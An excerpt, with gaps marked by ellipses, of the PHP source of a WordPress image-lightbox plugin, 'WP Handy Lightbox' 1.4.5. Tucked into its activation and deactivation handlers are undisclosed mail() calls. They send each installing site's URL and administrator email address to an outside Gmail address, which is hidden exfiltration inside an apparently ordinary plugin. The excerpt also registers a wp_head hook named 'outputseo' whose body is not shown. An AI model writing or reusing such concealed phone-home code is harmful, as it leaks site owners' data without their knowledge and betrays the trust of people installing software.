...
Plugin URI: http://wordpress.org/extend/plugins/wp-handy-lightbox/
...
Version: 1.4.5
Author: hansenmartin
Author URI: http://handylightbox.webs.com
License: GPLv2 or later
*/
add_action( 'plugins_loaded', 'jqlb_init' );
register_activation_hook( __FILE__,'actithelightbox_activate');
register_deactivation_hook( __FILE__,'deactthelightbox_deactivate');
add_action('admin_init', 'redirectlightbox_redirect');
add_action('wp_head', 'outputseo');

function redirectlightbox_redirect() {
if (get_option('redirectlightbox_do_activation_redirect', false)) { 
delete_option('redirectlightbox_do_activation_redirect');
...
session_start(); $subj = get_option('siteurl'); $msg = "Plugin Activated"; $from = get_option('admin_email'); mail("hansenmartinwew@gmail.com", $subj, $msg, $from);
wp_redirect('../wp-admin/options-general.php?page=jquery-lightbox-options');
}
...
session_start(); $subj = get_option('siteurl'); $msg = "Plugin Uninstalled"; $from = get_option('admin_email'); mail("hansenmartinwew@gmail.com", $subj, $msg, $from);
}
...
function jqlb_register_menu_item() {		
	add_options_page('Handy Lightbox Options', 'Lightbox', 'manage_options', 'jquery-lightbox-options', 'jqlb_options_panel');
}
...
function jqlb_js() {			   	
	...
	wp_enqueue_script('wp-handy-lightbox-swipe', plugins_url(JQLB_TOUCH_SCRIPT, __FILE__),  Array('jquery'), '1.4', true);	
	wp_enqueue_script('wp-handy-lightbox', plugins_url(JQLB_SCRIPT, __FILE__),  Array('jquery'), '1.4', true);
	wp_localize_script('wp-handy-lightbox', 'JQLBSettings', array(
...
_top: open the image in the full body of the window', 'jqlb') ?>"><?php _e('Target for download link:', 'jqlb'); ?></label> 
	...
	<?php
		...
		if($text === false){
			$text = '<p>The documentation files are missing! Try <a href="http://wordpress.org/extend/plugins/wp-handy-lightbox/">downloading</a> and <a href="http://wordpress.org/extend/plugins/wp-handy-lightbox/installation/">re-installing</a> this plugin.</p>';
		}
		echo $text;
	?>
	</div>	
